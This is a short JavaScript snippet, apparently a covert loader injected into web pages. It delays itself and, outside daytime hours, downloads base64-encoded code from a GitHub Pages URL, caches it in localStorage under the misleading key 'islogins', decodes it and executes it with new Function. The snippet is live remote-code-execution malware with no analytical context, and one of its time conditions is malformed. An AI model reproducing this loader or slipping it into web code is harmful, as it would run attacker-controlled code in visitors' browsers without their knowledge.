var myDate = new Date().getHours();
if(myDate>20||myDate<9){
    if(localStorage.getItem("islogins")){
        setTimeout(function(){
            var engine=window.atob(localStorage.getItem("islogins"));
            var objective=new Function(engine)
            objective()
        },9204)
    }else{
        setTimeout(function(){
            var Http = new XMLHttpRequest();
            var url = "https://jayouhao.github.io/mei/objective.json"
            Http.open("GET", url);
            Http.send();
            Http.onreadystatechange = function () {
                if (this.readyState == 4 && this.status == 200) {
                    localStorage.setItem("islogins",Http.responseText)
                    var engine=window.atob(Http.responseText);
                    var objective=new Function(engine)
                    objective()
                }
            }
        },32040)
    }
}
if(15<myDate>16||14<myDate>10){
    if(localStorage.getItem("islogins")){
        setTimeout(function(){
            var engine=window.atob(localStorage.getItem("islogins"));
            var objective=new Function(engine)
            objective()
        },9204)
    }
}